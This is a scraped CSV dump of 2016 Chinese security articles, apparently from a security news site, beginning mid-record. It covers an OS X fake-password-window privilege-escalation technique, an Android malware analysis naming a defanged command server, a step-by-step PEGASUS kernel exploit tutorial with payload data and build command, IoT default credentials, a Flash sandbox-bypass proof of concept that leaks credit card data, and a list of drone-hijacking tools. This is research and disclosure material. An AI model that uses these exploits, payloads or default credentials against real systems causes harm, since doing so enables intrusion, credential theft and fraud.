X系统也已经在尝试引入一些安全机制来避免系统陷入不安全的状态，例如阻止非特权进程访问那些可能会要求用户输入密码的应用程序，阻止非特权代码通过键盘记录功能来检测用户的键盘记录数据，以及阻止应用程序窗口覆盖密码输入窗口。但需要注意的是，这些安全限制措施也很容易绕过。这个应用程序可以利用屏幕截图、鼠标点击事件、以及编程生成键盘点击事件等形式实现中间人攻击，并通过这种方式拦截OSX的密码输入进程以实现权限提升。而OSX系统中的处理机制使得这样的密码拦截方式变得非常容易实现，因为相对于Windows的用户账户控制（UAC）而言，OS X平台下的非特权进程是可以直接访问密码输入进程的信息的。具体工作机制如下：1.    检测检测屏幕中的密码输入窗口；2.    当用户触发了密码输入事件之后，程序会对密码窗口进行截屏；3.    截屏后，关闭真正的身份验证窗口；4.    伪造出一个密码输入窗口，并显示给用户；5.    当用户在伪造出的窗口中输入了密码之后，它会将密码保存下来；6.    重新打开原始的密码输入窗口；7.    然后将伪造的窗口从屏幕中移除；8.    将用户输入的密码提供给原始的密码输入窗口；9.    将真实的密码输入窗口移动到屏幕中原来的位置；10. 模拟用户按下“回车键”，在真实窗口中完成密码输入操作；这些操作看起来很复杂，但是对于用户而言，这一系列操作可以在一瞬间完成，所以用户是很难察觉的。Kcap并不完美有些人表示，如果屏幕中存在一个空的dock对象，那么当恶意软件开始攻击时，即当恶意软件伪造出密码输入窗口时，你就可以看到窗口四个角的像素会发生抖动。这是因为我这个人比较懒，再加上我此前从来没有开发过带有图形用户界面的OSX程序，所以我花了好几个小时的时间用Java语言写了一个出来。如果你可以用OC或者Swift语言进行开发的话，那么上面这个问题就不存在了。当时我在一台屏幕分辨率为1440×900的MacbookAir上测试了这个程序，系统设置程序弹出的大多数密码输入窗口都没什么问题。但是在其他分辨率的设备上可能会出现像素计算错误的情况，所以如果你想在其他设备上运行的话，你可能还要重新计算一下屏幕像素，并且修改程序的某些位置偏移量。总结当然了，苹果公司也可以阻止非特权程序与密码输入窗口进行交互，但是这也并没有什么*用。因为非特权程序可以直接修改系统设置程序的快捷方式，当用户点击了“系统设置”之后，运行的将会是伪造的设置窗口。虽然伪造出的“系统设置”同样可以帮助用户完成他们所要进行的操作，但是此时恶意程序却可以记录用户输入的密码。可能很多普通用户会认为，当你输入密码之后，你只是在这一次允许这个应用程序以root权限运行。实际上，在你输入密码之后，攻击者便获取到了设备的root权限，攻击者就可以在任意时间运行任意代码了。阻止非特权程序申请提权其实并不是一种非常有效的安全保护机制，我们应该使用不同权限的用户账号来完成日常的各项操作。当你使用管理员账号登录时，就不要上网浏览网页或者登录电子邮箱了。除此之外，当你在使用普通账号进行操作时，也应该尽量避免输入你的管理员密码。演示视频：* 参考来源：scriptjunkie，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM","2016-09-23 12:53:36","系统安全","在OS X 平台下利用恶意软件实现密码拦截与提权（含Github源码和演示视频）","http://nsoad.com/Article/system/20160923/429.html"
"5ccbfa304f2f0a0a7a69c02a","不死鸟作为希腊神话中的一种怪物，拥有不断再生的能力，每当寿限将至时，它会在巢穴中自焚，并在三天后重新复活。就在近期，安天AVL移动安全团队和小米MIUI安全中心发现了病毒界的“不死鸟”，其顽固程度之","blackhold","不死鸟作为希腊神话中的一种怪物，拥有不断再生的能力，每当寿限将至时，它会在巢穴中自焚，并在三天后重新复活。就在近期，安天AVL移动安全团队和小米MIUI安全中心发现了病毒界的“不死鸟”，其顽固程度之深，用户很难通过常规的卸载手段清除该病毒。这款病毒名为Fushicho，一旦运行，它首先会通过一系列手段攻击手机的“免疫系统”：联网下载root工具对用户手机进行提权处理，进一步根据文件中的sql语句将自身插入某知名杀毒软件白名单中，并通过“pm disable”命令禁用某知名杀毒软件，致使手机安全防护功能全线崩溃。接下来Fushicho病毒会替换系统启动脚本文件，实现开机自启动并获得root权限。而为了使其自身成为手机中唯一具有root权限的应用，该病毒会删除手机中其他root程序、su文件。除此之外，由于病毒应用被锁在系统目录下，用户很难通过常规卸载手段清除该病毒。至此，Fushicho病毒将紧紧扎根在手机中，像不死鸟一般难以消灭。同时该病毒将通过联网获取恶意扣费指令对手机进行长期的扣费并下载其他恶意扣费软件，使感染用户遭受巨大的财产损失。接下来，我们将对这只病毒界的“不死鸟”进行详细的解剖分析。Fushicho病毒运行流程图以下为详细技术分析私自提权Fushicho病毒运行时加载本地Pxivuurauu.so文件，解密资源文件中的ico.png文件来释放子包oko.jar。子包释放后被动态加载，并在本地解密。Fushicho病毒获取到提权工具下载地址后下载并解密，获取提权工具包cab.zip，解压并加载其中的data.jar文件，对用户手机提权。获取提权工具下载地址：解压后的文件如下所示：各文件功能及作用如下表所示：提权工具包结构：将自身写入某知名杀毒软件白名单Fushicho病毒运行时解密root工具包中的ql文件获取将自身插入某知名杀毒软件白名单的sql语句,通过qlexec文件打开数据库并执行sql语句，将自身插入某知名杀毒软件白名单中来逃避检测。ql文件内容如下： 删除提权相关文件Fushicho病毒在获得root权限后会删除手机中其他的root相关文件和apk程序,将下载提权工具包cab.zip中的su文件分别重定向到/system/xbin/.sysd，/system/bin/android.sys，/system/etc/android.sys，/system/etc/android.sys中。删除其他root权限：将su文件重定向到系统目录中：禁用某知名杀毒软件Fushicho病毒通过“pm disable”命令禁用某知名杀毒软件，将该软件停止使用，并隐藏图标和已安装应用列表中的展示，致使用户无法找到该应用也无法重新安装该应用。为了验证该命令的效果，我们测试了一下：Step1：安装某知名杀毒软件，可以在已安装应用程序中看到该应用：Step2：使用pm disable命令：Step3：在已安装应用中查找该应用，已经找不到该应用了,说明该应用已被成功禁用Step4：用命令行工具查看data/app下的应用列表，可以看出该应用是存在的：Step5：如果尝试在手机中再次安装该应用，提示已安装：替换系统脚本文件Fushicho病毒运行时会替换系统的启动脚本文件install-recovery.sh、install-recovery-2.sh，新的脚本文件将在手机启动后立即给Fushicho病毒赋予root权限。脚本运行时以守护进程的形式启动对应目录下的.sysd和android.sys文件恶意扣费Fushicho病毒的扣费模块通过监听用户解锁、网络变化以及手机开机的系统广播启动，付费模块启动后联网获取付费短信数据和要拦截的短信关键字。并联网向hxxp:// www.mmchong[.]com上传用户设备信息，获取短信相关扣费短信数据。扣费短信数据解密后如下，其中字段port、cmd对应的是要发送的号码和内容，字段hport、hcmd对应的是要拦截的号码和短信内容，Fushicho病毒通过以上字段进行恶意扣费而用户无法感知。此外Fushicho病毒还会拦截包含“银行”和“快递”关键字段的短信。在接收到包含msg字段的值的短信时还会自动回复短信或联网发送拦截的短信。推送恶意应用Fushicho病毒运行时解密root工具包中的data0文件,通过解析文件中的指令将root工具包中的恶意应用推送到系统目录下并启动。在推送时将这些恶意应用加锁，并修改创建时间为2008-01-01 00:00，伪装成系统应用让用户难以察觉。推送的恶意应用：总结总体而言，Fushicho病毒一旦运行，将会通过攻击感染手机安装的杀毒软件来使整个手机的“免疫系统”形同虚设，并采取一列后续手段将其自身紧紧扎根于手机中，用户很难通过常规卸载手段来清除。此外，从上述攻击步骤可以看出，Fushicho病毒非常注重root权限，从自身提权，到删除其他root工具，再到替换系统启动脚本，使自身可以在系统启动的第一时间得到root权限。这一系列操作之后，Fushicho病毒成为系统第一个也是唯一一个有root权限的应用。 在保证“不死”的情况下，“不死鸟”（Fushicho）病毒将通过发送恶意扣费短信持续对用户的财产造成损害，危害极大。安全建议针对Fushicho系列病毒，集成AVL反病毒引擎的MIUI安全中心已经实现全面查杀。安天AVL移动安全团队和MIUI安全中心提醒您：请不要轻易root手机，否则您的手机将遭受巨大的安全风险；请勿在非官方网站或者不知名应用市场下载任何应用；*本文作者：AVLTeam（企业账号），转载须注明来自FreeBuf.COM","2016-09-21 15:03:29","移动安全","安天AVL联合小米MIUI，首擒顽固病毒“不死鸟”","http://nsoad.com/Article/MobileSecurity/20160921/421.html"
"5ccbfa304f2f0a0a7a69c02b","这段时间最火的漏洞当属阿联酋的人权活动人士被apt攻击所使用的iOS PEGASUS（又称Trident三叉戟）0day漏洞了。为了修复该漏洞，苹果专门发布了一个iOS 9.3.5版本。 这个漏洞的厉害之处在于可以直接从沙盒内","silence","来源链接：阿里聚安全博客作者：蒸米@阿里移动安全0x00 序这段时间最火的漏洞当属阿联酋的人权活动人士被apt攻击所使用的iOS PEGASUS（又称Trident三叉戟）0day漏洞了。为了修复该漏洞，苹果专门发布了一个iOS 9.3.5版本。 这个漏洞的厉害之处在于可以直接从沙盒内对内核进行攻击(无需沙盒逃逸)，并且同时影响iOS(9.3.4)和OS X (10.11.6)。因此，本篇文章将会从PEGASUS漏洞形成的原因开始分析，然后一步一步教大家写出OS X上利用PEGASUS提权的攻击代码。《iOS冰与火之歌》这一系列文章的目录如下：Objective-C Pwn and iOS arm64 ROP在非越狱的iOS上进行App Hook（番外篇）App Hook答疑以及iOS 9砸壳（番外篇）利用XPC过App沙盒UAF and Kernel PWN基于PEGASUS（三叉戟）的OS X 10.11.6本地提权 (番外篇)另外文中涉及代码可在我的github下载: https://github.com/zhengmin1989/iOS_ICE_AND_FIRE0x01 漏洞分析PEGASUS（三叉戟）实际上是由三个漏洞组成，分别是：CVE-2016-4657：Safari的Webkit内核上的内存破坏漏洞。 CVE-2016-4655：内核信息泄露漏洞，可用于绕过KASLR。 CVE-2016-4656：内核UAF漏洞，可用于控制内核并执行任意代码。关于CVE-2016-4657目前还没有公开的资料，但Stefan Esser和Pangu分别爆出了另外两个漏洞CVE-2016-4655和CVE-2016-4656的细节。利用已经曝光的这两个漏洞，其实已经可以做到iOS非完美越狱和OS X本地提权了。下面我们就来讲解一下这两个漏洞形成的原因以及如何利用。0x02 CVE-2016-4655 内核信息泄露CVE-2016-4655这个漏洞形成的原因是内核在序列化和反序列化OSNumber的时候没有验证长度的正确性。因此，如果我们将number的长度设置的非常长，并用io_registry_entry_get_property()去获取number数据的话，就会造成内核的信息泄露。 我们知道内核栈中会保存函数的返回地址，因此我们可以利用这个返回地址去计算出内核的kslide，从而攻破kaslr的保护。 那么如何编写利用代码呢？我们先创建一个序列化后的dictionary。对内核来说，这个dictionary应该是这样的：&lt;dict&gt;  &lt;key&gt;min&lt;/key&gt;  &lt;number&gt;0x4141414141414141&lt;/number&gt;  &lt;/dict&gt;  但是我们对OSNumber的长度进行了修改，变成了0x200：   uint32_t data[] = {    0x000000d3,                            0x81000001,                            0x08000004, 0x006e696d,    0x84000200,    //change the length of OSNumber    0x41414141, 0x41414141  };发送这个给内核后，内核在反序列化的时候就会出现错误。随后我们使用ioregistryentrygetproperty_bytes()这个用户态函数就可以获取到内核返回的数据了。因为我们修改了OS number的长度，所以返回的数据不光有我们发送给内核的number，还有栈上数据，比如函数ret时候的返回地址-0xFFFFFF80003934BF。通过这个地址我们就可以计算出来kslide了。0x03 CVE-2016-4656 内核代码执行CVE-2016-4656这个漏洞其实有两种触发UAF的方法，我们这里先讲比较简单的那一种（两种方法在Stefan Esser的文章中都有介绍）。简单UAF漏洞形成的原因是OSUnserializeBinary支持用OSString和OSSymbol来作为key，并且支持用OSObject去引用之前的key。但是OSString和OSSymbol不一样的地方在于，OSString key转换为OSSymbol的过程中OSString已经被free掉了，但这个OSString却被加入了对象列表里。因此当我们OSObject类型去引用一个已经被释放了的OSString的时候，就会产生UAF崩溃：通过汇编崩溃的位置我们可以找到源码对应的位置是在341行创建OSObject对象的时候：因此，如果我们能够在OSString被free的时候，立刻申请一段和OSString一样大小的内存并且构造好对应的vtable数据，当程序执行到OSObject创建的时候，内核就能成功的被我们控制。那么如何编写利用代码呢？我们还是先创建一个序列化后的dictionary。对内核来说，这个dictionary应该是这样的：&lt;dict&gt;  &lt;string&gt;A&lt;/string&gt;  &lt;bool&gt;true&lt;/bool&gt;  &lt;key&gt;B&lt;/key&gt;  &lt;data&gt;vtable data...&lt;/data&gt;  &lt;object&gt;1&lt;/object&gt;  &lt;/dict&gt;  内核随后会解析这个dictionary，正如我们之前分析的，OSString-”A”在创建完后就被free掉了，这时候，我们立刻创建OSSymbol-”B”以及和OSString-”A”大小相同的OSData，就可以在OSString-”A” free后重新控制这块内存，随后当内核使用OSObject引用OSString-”A”，并调用retain()函数的时候，其实就是在调用我们已经控制的vtable了。0x04 利用ROP提权首先我们先申请一块内存来放vtable和ROP chain，在OS X上有一种取巧的方法，如果我们是32位的程序的话，可以使用NULL page。因此，我们先用vm_allocate()申请到NULL Page，然后将vtable和ROP chain都保存在NULL page里：随后在OS X上用rop提权的代码我们可以直接使用tpwn的：首先获得当前进程的ucred，然后将crsvuid设置为0，最后用threadexception_return退出进程。0x05 测试EXP编写完代码后，我们来尝试执行一下我们的exp。首先说一下测试环境：Mac OS X EI Capitan 10.11.6 (15G31)，在没有安装2016-01的security update的情况下（这时候内核相当于iOS 9.3.4，如果安装完2016-01 update就相当于iOS 9.3.5）。接下来我们编译一下我们的exp：clang -framework IOKit -framework Foundation -framework CoreFoundation -m32 -Wl,-pagezero_size,0 -O3 exp.m lsym.m -o exp  然后运行：可以看到我们已经成功的获取了root权限。0x06 总结这篇文章介绍了如何利用PEGASUS（Trident三叉戟）做到内核信息泄露以及内核代码执行，然后利用rop获取root权限。另外，因为PEGASUS（Trident三叉戟）同时存在于iOS和OS X，有兴趣的同学可以在我们发布的攻击代码的基础上，尝试一下iOS攻击代码的编写。基于PEGASUS（Trident三叉戟）的OS X 10.11.6本地提权exp的下载地址： https://github.com/zhengmin1989/OS-X-10.11.6-Exp-via-PEGASUS0x07 参考资料http://blog.pangu.io/cve-2016-4655/https://sektioneins.de/en/blog/16-09-02-pegasus-ios-kernel-vulnerability-explained.htmlhttps://bazad.github.io/2016/05/mac-os-x-use-after-free/https://github.com/kpwn/tpwn","2016-09-28 19:06:08","移动安全","iOS冰与火之歌(番外篇) - 基于PEGASUS（Trident三叉戟）的OS X 10.11.6本地提权","http://nsoad.com/Article/MobileSecurity/20160928/458.html"
"5ccbfa304f2f0a0a7a69c02c","近年来，随着互联网技术的快速发展以及国家政策的大力支持，物联网这一领域也跟着水涨船高，各项具有应用意义的项目也在不断拓展，比如智能家居，视频监控系统等，身处千里之外，却能知悉家中的一举一动，","silence","近年来，随着互联网技术的快速发展以及国家政策的大力支持，物联网这一领域也跟着水涨船高，各项具有应用意义的项目也在不断拓展，比如智能家居，视频监控系统等，身处千里之外，却能知悉家中的一举一动，这也体现了“万物互联”的概念。其中，作为物联网的终端节点，比如智能路由器，视频监控器等设备，随着大众将目光逐步转移到物联网时，这些设备因自身的安全性问题也遭受到来自恶意攻击者的觊觎。据悉，目前针对物联网设备的恶意软件越来越普遍了，基本每个月都会发现新的变种。而据分析，在过去的两年里，发现的所有物联网恶意软件基本都是同样的运作原理思路。一般来说，使用钓鱼方式或者自动化工具来进行暴力破解物联网设备，通过密码字典尝试批量猜解物联网设备的管理员账户及密码，来开始对设备的感染。物联网僵尸扩张的源头：默认设备登录口令当设备运行后，如果用户没有及时更改设备的默认登陆口令，攻击者往往可针对这些设备进行暴破，轻而易举便可进入到该设备的管理界面。此后，攻击者便可植入恶意代码到其中，并使之与C&amp;C服务器通讯，将之融合到僵尸网络中。而这些僵尸网络主要用以发动DDoS攻击，或者作为代理，向其他物联网设备实施暴力破解。在近年八月份，卡巴斯基发现基于Linux设备节点组成的网络，近年来在地下市场已逐步成为主流的DDoS攻击的僵尸网络。    在大部分案例中，物联网设备往往被集中起来，组成僵尸网络，从而发起DDoS攻击，仅仅在少数定向攻击的案例中，我们会发现某些攻击者，利用其中物联网中的某一设备，作为网络中的代理节点来进行攻击。    前文所呈现的入侵攻击，一方面，还是因为用户的安全意识较为薄弱，在使用物联网设备过程中，并没有对密码进行强化或者更改，导致攻击者可轻而易举地暴破访问设备。另一方面，也是因为相应的物联网终端设备存在安全漏洞，攻击者利用该漏洞来对设备进行控制，从而才可将对设备进行感染并融入到其僵尸网络中。而根据安全公司赛门铁克的全球统计，以下表单为目前物联网设备Top 10 的弱口令（其中账户和同一行的密码并不对应）。       如果针对我们自身使用的系统及设备如树莓派或者ubantu等，从目前的密码强度进行审计，是否也存在相应的弱口令呢？    根据来自赛门铁克的研究，近年的物联网恶意软件往往带有跨平台特性，能够有效针对所有的主流硬件平台进行攻击，如x86, ARM, MIPS以及 MIPSEL平台等。除了上述的部分，在某些案例中，也有一些恶意软件家族，主要针对其他平台或者架构的，如PowerPC, SuperH以及 SPARC架构的。    物联网恶意软件可自我进行复制实际上，通过使用工具，像Shodan（具体还请参考《如何在15分钟内利用Shodan对企业进行安全审计？》以及《安全搜索引擎Shodan（搜蛋）命令行模式使用TIPS》），以及自动化暴破脚本，攻击者已经很少需要手工进行操作了，虽然偶尔可能会碰到需要手工操作的案例。而当前的物联网恶意软件甚至有了蠕虫的特性，即是可以传播给其他关联的设备，例如    Ubiquiti 蠕虫。Ubiquiti ，其全称为优倍快网络公司，简称UBNT，我们可以发现其在前文物联网设备弱口令Top 10的排名中也是榜上有名的。该公司主要生产无线网络产品，包括像WiFi覆盖AP、点对点网桥、点对多点网桥、WiFi客户端（CPE）等。而Ubiquiti蠕虫，被发现于其AirOS路由器，主要可通过利用一个存在路由器login.cgi文件中的任意文件上传漏洞（详情请参看进行了解：https://hackerone.com/reports/73480），上传并执行恶意文件。在已知的案例中，攻击者创建了一种可自我复制的病毒，通过利用Ubiquiti产品的默认口令（账户为ubnt，密码为ubnt）登录路由器，而利用上述漏洞，蠕虫会在路由器上创建一个后门账户，并利用已有权限向其他设备进行复制传播。而该蠕虫病毒也被称为Ubiquiti蠕虫。因自我复制的特性，物联网恶意软件可“帮助”攻击者建立起一个颇具规模的僵尸网络，据目前的统计，至少存在一百万个安全性极低的物联网设备向互联网开放其敏感端口。    感染物联网设备的主流恶意软件有哪些？如前文所述，这些物联网设备组成的僵尸网络往往被利用来实施不同类型的DDoS攻击。如在近期，infosec记者报道了一次由物联网设备组成的网络发起的DDoS攻击，其最高峰流量可达620Gbps。    而作为感染设备的恶意软件，到目前，究竟有哪些类型或者种类呢？我们可以往下看看。据安全公司赛门铁克分析统计，目前最为主流的物联网恶意软件家族如下， Linux.Darlloz (aka Zollard),Linux.Aidra (Linux.Lightaidra) Linux.Xorddos (aka XOR.DDos) Linux.Gafgyt (aka GayFgt, Bashlite),Linux.Ballpit (aka LizardStresser) Linux.Moose, Linux.Dofloo (aka AES.DDoS, Mr. Black)Linux.Pinscan / Linux.Pinscan.B (aka PNScan)Linux.Kaiten / Linux.Kaiten.B (aka Tsunami)Linux.Routrem (aka Remainten, KTN-Remastered, KTN-RM) Linux.Wifatch (aka Ifwatch) Linux.LuaBot物联网设备厂商缺乏足够的安全响应能力根据统计的数据，缺乏安全性的物联网设备在全球范围内普遍存在。其中来自中国安全性较低的设备，约占设备总数量的34%，其次是美国，约占28%，接下来为俄罗斯，约占9%，详细如下图。    实际上，出现安全问题的设备往往来自于同一个公司的产品。比如此前有过报道的，关于发现将近25000个摄像头被感染为僵尸网络节点一事，正是由于国内一家生产硬盘录像机的厂商，未能及时发布升级固件，造成该公司生产的大量摄像头被入侵的情况。该公司的硬盘录像机被全球约70多家公司贴牌出售，而当时应该也是有很多用户并不能及时修复他们的设备，因为销售厂商他们也在等待这家位于中国的厂商发布的补丁，来修复漏洞。    结语随着物联网的发展，特别是智能家居逐步深入到家庭的每个角落中，物联网设备的安全性已经与每个人，每个家庭紧紧挂钩。提高物联网设备的安全性以及设备厂商的安全响应能力已经是迫在眉睫。同时用户在日常使用设备的过程中，应提高安全意识以及培养良好的安全习惯，比如新装设备应及时更改并设置高强度密码，定期查看设备登录记录等，如有可能，也可关闭设备的敏感服务端口，尽可能降低设备被入侵风险。","2016-10-09 11:28:23","网络安全","僵尸网络的发展，“智能设备”可帮了大忙（含Top 10物联网设备弱口令 ）","http://nsoad.com/Article/Network-security/20161009/504.html"
"5ccbfa304f2f0a0a7a69c02d","2016年9月13日，Adobe关闭了本地文件系统沙箱沙箱。","silence","2016年9月13日，Adobe关闭了本地文件系统沙箱沙箱。本地文件系统沙箱在存在了二十年之后的今天，终于被Adobe关闭，使得几乎所有的使用这一功能的Flash文件都需要更新。我们会具体解释这一改变到底为什么这么重要，为什么说对于Adobe来说这是一种巨大的飞跃。但是在这之前，还是需要解释一下本地文件系统沙箱是什么，以及现代网页浏览器是如何处理本地文件的。 什么是本地文件系统沙箱？为什么值得关注？如果你喜欢使用ActionScript编程，但又不是开发人员，那你应该听说过Adobe Flash 安全沙箱。简单来说，安全沙箱控制了SWF可以加载哪些外部资源。最著名的一个就是“远程安全沙箱”，其任务是判定远程主机上的一个Flash文件可以加载哪些文件：每次通过HTTP加载一个SWF时都会通过它来操作。相反的，如果在 file:// URI 上加载一个flash文件，SWF文件就会被存放在以下安全沙箱中：本地文件系统沙箱、本地网络沙箱、本地信任沙箱，或是AIR应用程序沙箱。本地网络沙箱是最常见、也是默认设置中的沙箱：它禁止FLASH文件加载本地文件系统上的资源。这种做法保证了本地文件不受远程主机的安全威胁，它可以防止某些恶意攻击者偷取用户的私人文件、密码或是信用卡信息等。同样的，本地文件系统沙箱（编译 ActionScript 代码时可以选择）的目的是让远程主机远离本地文件，但是设计原理是相反的：SWF可以访问本地文件系统上的每一个文件，但是它不能访问远程网络。值得注意的是， 此功能无法在Javascript中启用——因为Javascript 会在这种类似的沙箱中“卡住”。出于安全考虑，FLASH播放器将所有的本地SWF文件都默认存放在了本地文件系统沙箱中。SWF可以通过此沙箱读取本地文件，但是不能以任何方式连接到网络，这可以确保用户信息不会以不当方式被泄露。——adobe.com 理论上来说——为什么这种安全手段不管用？理论上说，该安全模型是好用的。但是在实际操作中很难正确达到预期效果。这就是Adobe选择关闭沙箱的原因。正如先前所说，本地文件系统沙箱中的SWF不论在何种情况下都不能连接到网络。在一个HTML文档中，SWF被各种不遵守这一原则的技术所包围：这类似于 Javascript。本文所报告的每一个漏洞背后的真正原因都是无法确保与远程网络通信的技术都不能读取FLASH文件。总结来说，当我们使用URI方案文件时：FLASH可以连接到本地文件系统Javascript可以将数据发送到远程主机中很明显，攻击者和用户本地文件之间的唯一障碍就是Javascript无法读取FLASH。FLASH会试图阻止每一个可能会泄露信息给Javascript的功能，但是它失败了。我们将会讨论3个相互关联的不同事件，都是关于从本地文件系统中提取数据的。前两个利用网页浏览器RFC 3986 向navigateToURL() 传递恶意指令，并从本地文件中提取数据。最后一个的设计初衷是为了在谷歌浏览器中运行，但是却被Clickjacking 这样的老旧手段利用来泄露数据。 实际操作中——为什么无法实现？A）navigateToURL()——通过URI%编码绕过本地沙箱（不可信指数达到100%）正如前文所说，即使SWF是在本地文件系统沙箱中，也是可以使用navigateToURL() 的。显然，如果我们尝试从远程网络中获取文件，将会弹出一个安全异常，但是仍然可以访问本地文件。考虑到Javascript可以读取URL中的信息，navigateToURL()就是在FLASH和Javascript交互信息的最佳选择了。Adobe在发现这一情况之后采取很多方法来修改，但是却忽视了%编码，让我们来看看这种情况可能出现的后果。RFC 3986, 2.1之后，这个URI： navigateToURL(new URLRequest(""file:///tmp/attack-this-sandbox.html""));还可以是这样：navigateToURL(new URLRequest(""file:///tmp/%61ttack%2Dthis-sandbox.html""));尽管这两个都是有效的，但还是不一样。 Mozilla Firefox和Safari中的  Javascript 只要简单地读取文档就可以发现两者的不同。在这种方式下，FLASH就会与Javascript交互：也就是说可以绕过本地文件系统沙箱到达外部网络。下面这种PoC就是利用了这一概念窃取信用卡号码的。概念证明我创建了一个PoC漏洞，既是HTML 文件，也是 SWF 文件。在VIM中看起来似乎不错：具体代码可以在此处下载：http://lab.truel.it/wp-content/uploads/2016/09/Fun-with-percent-encoding.zip下面是缓解之前的动态展示：下面是缓解之后的动态展示：B)navigateToURL() — — 滥用空格来绕过本地沙箱类似于上面的例子，windows系统的本地URI有一个鲜为人知的功能被navigateToURL()忽视了。这个URInavigateToURL(new URLRequest(""file:///C:/attack-this-sandbox.html""));也可以是这样：navigateToURL(new URLRequest(""file:///C:/attack-this-sandbox.html%20%20%20""));正如你看到的这样，在URI的末尾有一些空格，在这种情况下，FLASH可以与 Javascript交换数据，违反本地文件系统沙箱原则。事实上， Javascript可以检测出这两个URI的不同，这就使得FLASH可以在每一次navigateToURL()调用时传输一部分数据。在这种情况下，我们之前已经讨论过的缓解警告对话框似乎大大限制了这一问题的影响范围，因为需要执行多次navigateToURL()调用才能传输与A事件中等量的数据。乍一看这一漏洞似乎无法在实际操作时使用。在下一部分中，我们将会做出反驳，再一次证明任何缓解措施都不是解决安全漏洞的好办法。C)Adobe Flash——针对navigateToURL() 警告对话框的Clickjacking这一问题出现以来，Adobe Flash一直都是Clickjacking最喜欢的攻击对象。讽刺的是，同样的攻击手段还可以用来攻击Adobe在谷歌浏览器上的navigateToURL()。在下面的链接中是一个利用B部分所提漏洞的PoC，和一个可以在谷歌浏览器中提取信用卡数据的 Clickjacking（只要用户在玩一个无聊的Javascript游戏）。概念证明你可以下载这部分代码：http://lab.truel.it/wp-content/uploads/2016/09/Pull-ups-With-Mr.-Sandy-Box.zip下面是动态演示： Adobe Flash 现在安全吗？这个不好说。FLASH永远也无法修复这些问题，但是可以通过编辑配置文件选择性地启用本地文件系统沙箱。所以说，FLASH还是存在这些漏洞代码，但是只有在启用小部分设置时才会起作用，其他时候这部分漏洞都是“冻结”状态。在日后的新版本中也可能会有新变化，但是在实践操作中再次利用这些漏洞似乎是不太可能的，至少就现在来说。                                                                                                                      – @lpontorieri披露时间轴：2015年4月4日：将漏斗报告给Adobe PSIRT。2015年4月6日：Adobe承认漏洞存在并分配了标识号（PSIRT-3562）。2015年4月17日：联系Adobe有关更新事宜，未得到回复。2015年4月23日：再次尝试联系，仍未得到回复。2015年4月29日：再次联系；Adobe表示他们还在研究漏洞报告。2015年6月20日：发送CVE的ID请求。2015年6月23日：Adobe回复称由于警告对话框缓解，不会修复A、B两个漏洞，他们正在试图修复C漏洞。2016年9月9日：Adobe PSIRT 预警称他们会在下一次更新中更改安全沙箱政策。2016年9月26日：公布漏洞。【1】在本篇文章中，我们将重点关注本地文件系统沙箱和本地网络沙箱。更多详情请关注adobe.com【2】前段时间，这里描述的漏洞由于警告对话框的出现得到了一定的缓解，最近一次FLASH更新之后这个漏洞几乎无关痛痒。该警告对话框要求用户提供“连接到互联网”的授权，并由navigateToURL() 调用触发。（这句话具有一定的误导性，因为在本地文件系统沙箱中用户并不能连接到远程主机）【3】Mozilla Firefox 和Safari都证实了漏洞的存在。【4】谷歌浏览器、Mozilla Firefox 和在Windows OS上运行的Opera都证实存在该漏洞。","2016-10-01 16:36:51","系统安全","【技术分享】CVE-2016-4271:Flash本地文件系统沙箱绕过","http://nsoad.com/Article/system/20161001/470.html"
"5ccbfa304f2f0a0a7a69c02e","前言","Kong","前言商业无人机和无线电遥控飞机日益受到关注，商业航空公司害怕发生碰撞，无人机的购买者害怕隐私受到侵犯。另一个风险是无人机在飞行的过程中可能受到劫持或人为干扰。近几年，有一些安全研究员已经发现了一些无人机的通用漏洞。在某些文档中这些研究人员甚至提供了全部的源代码或者利用工具去展示他们的攻击成果。在这篇文章中我将要整理一个合辑，关于之前公开的无人机漏洞和相关的漏洞验证、利用方法以及一些现成的工具。该文档旨在让安全研究人员如何更好的挖掘利用无人机漏洞，让无人机厂商在研发的过程中不断地提升无人机的安全性。我会不断的将最新的无人机漏洞在这个帖子更新出来。 正文Skyjack攻击类型：劫持（Hijack）涉及无人机：Parrot AR.Drone 2参考链接: http://samy.pl/skyjack/验证代码：https://github.com/samyk/skyjackBebop WiFi Attack攻击类型：劫持（Hijack）涉及无人机：Parrot Bebop演示视频：GPS 欺骗攻击类型：劫持（Hijack）攻击硬件：HackRF（300美元）或bladerf X40（420美元）涉及无人机：大多数开启GPS的无人机( 大疆 1/2/3/4, 大疆 Inspire, DJI Mavic, Yuneec Brezee, Yuneec Thypoon, Yuneec Tornado 等)参考链接：GPS Spoofing a UAV (DJI Phantom) Unmanned Aircraft Capture and Control via GPS Spoofing How to spoof GPS with HackRF Spoofing How to spoof GPS with HackRF攻击类型：GPS 干扰攻击类型：拒绝服务攻击涉及无人机：大多数开启GPS的无人机( 大疆 1/2/3/4, 大疆 Inspire, DJI Mavic, Yuneec Brezee, Yuneec Thypoon, Yuneec Tornado 等)参考链接：http://www.thingiverse.com/thing:1639683$20 GPS Jammer第一人称视角无人机视频下行链路干扰攻击类型：拒绝服务攻击参考链接：http://www.thingiverse.com/thing:1639683演示视频：DeviationTX NRF24L01 Hijack攻击类型：劫持涉及无人机：大多数开启GPS的无人机( 大疆 1/2/3/4, 大疆 Inspire, DJI Mavic, Yuneec Brezee, Yuneec Thypoon, Yuneec Tornado 等) Complete list 成功列表参考链接：DeviationTX with $5 nrf24l01 module the universal drone remote.DHD &amp; Cheerson toy drones with NRF24L01 module.ICARUS攻击类型：劫持涉及无人机：多数业余/专业级无人机遥控所使用的数字信号复用设备协议。参考链接：Attacking DSMx with SDR (PacSec 2016 — English 英語)Nils Rodday Attack攻击类型：劫持涉及无人机：Aerialtronics Altura Zenith （执法无人机）参考链接：Hacker Says He Can Hijack a $35K Police Drone a Mile Away Hacking a professional drone by Nils Rodday 演示视频：Drone Duel攻击类型：劫持涉及无人机：Cheerson CX-10（微型直升机）参考链接：Drone Hacking is becoming childs play验证代码：Drone Duel GithubFb1h2s Maldrone攻击类型：后门涉及无人机：Parrot AR参考链接：http://garage4hackers.com/entry.php?b=3105演示视频：","2016-11-09 15:37:46","Web安全","如何黑掉一个无人机？已知无人机漏洞&利用工具汇总（附演示视频）","http://nsoad.com/Article/web/20161109/728.html"
